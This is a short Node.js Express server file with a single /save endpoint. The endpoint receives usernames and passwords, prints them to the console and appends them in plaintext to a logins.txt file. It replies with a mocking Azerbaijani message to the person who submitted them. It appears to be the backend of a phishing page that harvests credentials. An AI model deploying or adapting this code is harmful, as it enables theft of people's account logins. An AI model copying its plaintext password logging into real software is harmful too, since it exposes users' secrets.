const express = require("express");
const fs = require("fs");
const app = express();
const port = 3000;

app.use(express.json());

app.post("/save", (req, res) => {
  const { username, password } = req.body;
  console.log("Username:", username);
  console.log("password:", password);
  const loginData = `Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync("logins.txt", loginData);
  res.json({ message: "Melumatlar alındı kişi bala" });
});

app.listen(port, "0.0.0.0",() => {
  console.log(`Server http://localhost:${port} `);
});